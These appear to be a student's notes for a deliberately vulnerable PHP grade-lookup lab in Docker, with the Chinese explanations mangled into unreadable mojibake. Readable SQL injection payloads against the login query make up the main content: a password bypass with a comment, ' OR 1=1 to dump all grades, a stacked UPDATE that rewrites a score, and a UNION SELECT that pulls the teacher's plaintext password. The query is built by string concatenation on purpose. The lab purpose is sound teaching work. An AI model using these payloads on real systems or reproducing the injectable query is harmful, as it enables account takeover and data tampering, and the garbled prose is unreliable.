
æ¼æ´1.æŸ¥è©¢ä»–äººæˆç¸¾ï¼Œåœ¨ä¸çŸ¥é“å¯†ç¢¼çš„æƒ…æ³ä¸‹(èˆ‰ä¾‹æŸ¥å­¸ç”Ÿ2)

    ğŸ’¡åŸç†:é€éå–®å¼•è™Ÿ ' ææ—©çµæŸå¸³è™Ÿå­—ä¸²ï¼Œä¸¦ç”¨ # è¨»è§£æ‰å¾Œæ–¹çš„å¯†ç¢¼æª¢æŸ¥ï¼Œä½¿è³‡æ–™åº«åƒ…é©—è­‰å­¸è™Ÿå³å›å‚³è³‡æ–™ã€‚

    1ï¸âƒ£æ³¨å…¥å‰: 
    $sql = "SELECT * FROM userTable 
    JOIN scoreTable ON userTable.username = scoreTable.studentId 
    WHERE userTable.username = '$id' AND userTable.password = '$pass'";
    
    2ï¸âƒ£æ”»æ“Šèªå¥:S002' #

    3ï¸âƒ£æ³¨å…¥å¾Œ:
    SELECT * FROM userTable
    JOIN scoreTable ON userTable.username = scoreTable.studentId
    WHERE userTable.username = 'S002' # ' AND userTable.password = 'ä»»æ„æ–‡å­—' 

    4ï¸âƒ£çµæœ:å°å‡ºå­¸ç”Ÿ2çš„æˆç¸¾

æ¼æ´2.æŸ¥è©¢å…¨ç­æˆç¸¾

    ğŸ’¡åŸç†:åˆ©ç”¨ OR 1=1 å‰µé€ ä¸€å€‹æ°¸é æˆç«‹çš„æ¢ä»¶ï¼Œè®“è³‡æ–™åº«åˆ¤å®šæ¯ä¸€è¡Œè³‡æ–™éƒ½ç¬¦åˆç¯©é¸è¦æ±‚ï¼Œé…åˆ # è¨»è§£å¯†ç¢¼å¾Œå¯ä¸€æ¬¡æŠ“å‡ºæ‰€æœ‰äººçš„æˆç¸¾ã€‚

    1ï¸âƒ£æ³¨å…¥å‰ï¼š 
    $sql = "SELECT * FROM userTable 
    JOIN scoreTable ON userTable.username = scoreTable.studentId
    WHERE userTable.username = '$id' AND userTable.password = '$pass'";

    2ï¸âƒ£æ”»æ“Šèªå¥ï¼š' OR 1=1 #

    3ï¸âƒ£æ³¨å…¥å¾Œï¼š
    SELECT * FROM userTable
    JOIN scoreTable ON userTable.username = scoreTable.studentId 
    WHERE userTable.username = '' OR 1=1 # ' AND userTable.password = 'ä»»æ„æ–‡å­—'

    4ï¸âƒ£çµæœ:æŸ¥å‡ºå…¨ç­æˆç¸¾

æ¼æ´3.ç«„æ”¹ä»–äººæˆç¸¾(å †ç–ŠæŸ¥è©¢)

    ğŸ’¡åŸç†ï¼š ä½¿ç”¨åˆ†è™Ÿ ; çµæŸç¬¬ä¸€æ¢æŸ¥è©¢æŒ‡ä»¤ï¼Œéš¨å¾Œç·Šæ¥ä¸€æ¢å…¨æ–°çš„ UPDATE ä¿®æ”¹æŒ‡ä»¤ã€‚æ­¤æ¼æ´å¿…é ˆåœ¨ PHP ç¨‹å¼ç¢¼ä½¿ç”¨ multi_query() å‡½å¼æ™‚æ‰æœƒç”Ÿæ•ˆã€‚

    1ï¸âƒ£æ³¨å…¥å‰ï¼š 
    $sql = "SELECT * FROM userTable 
    JOIN scoreTable ON userTable.username = scoreTable.studentId
    WHERE userTable.username = '$id' AND userTable.password = '$pass'";

    2ï¸âƒ£æ”»æ“Šèªå¥ï¼š S001'; UPDATE scoreTable SET score = 100 WHERE studentId = 'S001' #

    3ï¸âƒ£æ³¨å…¥å¾Œï¼š 
    SELECT * FROM userTable
    JOIN scoreTable ON ... WHERE userTable.username = 'S001'; UPDATE scoreTable SET score = 100 WHERE
    studentId = 'S001'; # ' AND userTable.password = 'ä»»æ„æ–‡å­—'

    4ï¸âƒ£çµæœ:ç«„æ”¹å­¸ç”Ÿ1çš„æˆç¸¾ç‚º100

æ¼æ´4.å–å¾—è€å¸«å¸³è™Ÿå¯†ç¢¼

    ğŸ’¡åŸç†:åˆ©ç”¨ UNION SELECT åˆä½µå¦ä¸€å ´è‡ªå®šç¾©çš„æŸ¥è©¢ã€‚é€éä½”ä½ç¬¦ 1, 2, 3 å¡«å……ä¸é¡¯ç¤ºçš„æ¬„ä½ï¼Œå°‡çœŸæ­£çš„è€å¸«å¸³å¯†ï¼ˆusername, passwordï¼‰å¡å…¥ç¶²é æœƒé¡¯ç¤ºçš„ã€Œå­¸è™Ÿã€èˆ‡ã€Œå§“åã€æ ¼å­ä¸­ã€‚
    
    1ï¸âƒ£æ³¨å…¥å‰: 
    $sql = "SELECT * FROM userTable  
    JOIN scoreTable ON userTable.username = scoreTable.studentId  
    WHERE userTable.username = '$id' AND userTable.password = '$pass'";

    2ï¸âƒ£æ”»æ“Šèªå¥:' UNION SELECT 1, 2, 3, username, password, 999 FROM userTable WHERE role='teacher' #

    3ï¸âƒ£æ³¨å…¥å¾Œ: 
    SELECT * FROM userTable 
    JOIN scoreTable ON userTable.username = scoreTable.studentId 
    WHERE userTable.username = '' UNION SELECT 1, 2, 3, username, password, 999 
    FROM userTable WHERE role='teacher' # ' AND userTable.password = ''
    
        --æŒ‡ä»¤æ‹†è§£--
        '                       é–‰åˆèªå¥:çµæŸåŸæœ¬çš„ username å­—ä¸²ï¼Œè®“å¾Œé¢çš„æŒ‡ä»¤ç”Ÿæ•ˆ
        UNION SELECT            è¯åˆæŸ¥è©¢:æŠŠè‡ªå·±å¯«çš„æŸ¥è©¢çµæœï¼Œæ¥åˆ°åŸæœ¬æŸ¥è©¢å¾Œé¢é¡¯ç¤º (åŸæœ¬å‰é¢''æŸ¥åˆ°çš„æ˜¯ç©ºçš„è³‡æ–™ï¼Œæˆ‘å†å¡ä¸€ç­†æˆ‘æƒ³è¦çš„è³‡æ–™é€²çµæœ)
        1, 2, 3	                å¡«è£œéš±è—æ¬„ä½ï¼šå°æ‡‰ userTable çš„å‰ 3 å€‹æ¬„ä½ï¼ˆusername, password, roleï¼‰ã€‚å›  PHP ä¸æœƒå°å‡ºé€™ä¸‰æ ¼ï¼Œæ‰€ä»¥éš¨ä¾¿å¡«æ•¸å­—ä½”ä½
        username	            å·å–å¸³è™Ÿï¼šæ”¾åœ¨ç¬¬ 4 æ ¼ï¼Œå°æ‡‰ç¶²é çš„ã€Œå­¸è™Ÿã€ä½ç½®ï¼Œè®“è€å¸«å¸³è™Ÿé¡¯ç¤ºå‡ºä¾†
        password	            å·å–å¯†ç¢¼ï¼šæ”¾åœ¨ç¬¬ 5 æ ¼ï¼Œå°æ‡‰ç¶²é çš„ã€Œå§“åã€ä½ç½®ï¼Œè®“è€å¸«å¯†ç¢¼é¡¯ç¤ºå‡ºä¾†
        999	                    å½é€ æ•¸æ“šï¼šæ”¾åœ¨ç¬¬ 6 æ ¼ï¼Œå°æ‡‰ç¶²é çš„ã€Œæˆç¸¾ã€ä½ç½®ï¼Œå¡«å…¥ç„¡æ„ç¾©çš„åˆ†æ•¸
        FROM userTable	        æŒ‡å®šä¾†æºï¼šè¦æ±‚å¾å¸³å¯†è¡¨ (userTable) æŠ“å–è³‡æ–™
        WHERE role='teacher'	éæ¿¾æ¢ä»¶ï¼šåªæŠ“å–èº«ä»½ç‚ºè€å¸«çš„è³‡æ–™åˆ—
        #                       æ³¨è§£å¾Œæ®µï¼šå°‡å¾Œæ–¹åŸæœ¬çš„å¯†ç¢¼é©—è­‰èªæ³•è®Šæˆè¨»è§£ï¼Œç¹éèº«åˆ†æª¢æŸ¥


    4ï¸âƒ£çµæœ:å–å¾—è€å¸«å¸³è™Ÿå¯†ç¢¼

    +----------+----------+----------+
    | username | password | role     |
    +----------+----------+----------+
    | S000     | admin123 | teacher  |
    | S001     | p001     | student  |
    | S002     | p002     | student  |
    | S003     | p003     | student  |
    | ...      | ...      | ...      |
    +----------+----------+----------+

    +-----------+---------+-------+
    | studentId | name    | score |
    +-----------+---------+-------+
    | S000      | Alex    | 85    |
    | S001      | Brian  | 60    |
    | S002      | Cathy  | 92    |
    | S003      | Daniel | 78    |
    | ...       | ...     | ...   |
    +-----------+---------+-------+

    +----------+----------+----------+-----------+---------+-------+
    | username | password | role     | studentId | name    | score |
    +----------+----------+----------+-----------+---------+-------+
    | S001     | p001     | student  | S001      | Brian  | 60    |
    +----------+----------+----------+-----------+---------+-------+


å°ˆæ¡ˆæ•´é«”é‹ä½œé‚è¼¯:

    [å­¸ç”Ÿç™»å…¥é  student_login.php]
            â†“ (POST å¸³è™Ÿå¯†ç¢¼)
    [ç™»å…¥é åŸ·è¡Œ SQL (JOIN) â€”â€” (æ¼æ´ä¿ç•™æ–¼æ­¤)]
            â†“
    [ç™»å…¥æˆåŠŸ â†’ å°‡ã€ŒDB å›å‚³çš„æŸ¥è©¢çµæœ rowsã€å­˜é€² Session]
            â†“
    [è·³è½‰ student_result.php]
            â†“
    [student_result.php åªå¾ Session è®€å‡º rows ä¸¦é¡¯ç¤ºï¼ˆä¸å†å° DB åšæŸ¥è©¢ï¼‰]













æ¥ä¸‹ä¾†å¯åšçš„æ–¹å‘...
    1.è£½ä½œå®‰å…¨ç‰ˆæœ¬ç•¶å°ç…§çµ„(å ±å‘Šæ™‚å®‰å…¨ç‰ˆ/æ¼æ´ç‰ˆå…©å€‹æ¯”å°)
    2.è€å¸«ç«¯?:å†åšä¸€å€‹ã€Œè€å¸«ç«¯ã€çš„ç®¡ç†ä»‹é¢:å¯ç›´æ¥æŸ¥çœ‹å…¨ç­æˆç¸¾ï¼Œæ¯ä¸€åˆ—å¾Œé¢æœ‰å€‹ã€Œä¿®æ”¹ã€æŒ‰éˆ•ï¼Œå¯ä»¥æ›´æ–°æˆç¸¾ 
    3.ä»‹é¢å„ªåŒ–ï¼Œè®“ç•«é¢æ›´åƒæˆç¸¾æŸ¥è©¢é é¢ (ç™»å…¥å¾Œéš±è—å¸³è™Ÿå¯†ç¢¼è¼¸å…¥æ¬„ä½ã€è¿”å›éµç­‰)

=== docker ç›¸é—œæŒ‡ä»¤ ===
    docker compose up -d --build
    docker compose down -v
    docker compose exec db mysql -u root -proot class_db -e "SELECT * FROM ScoreTable;" //æŸ¥çœ‹è³‡æ–™åº«å…§éƒ¨

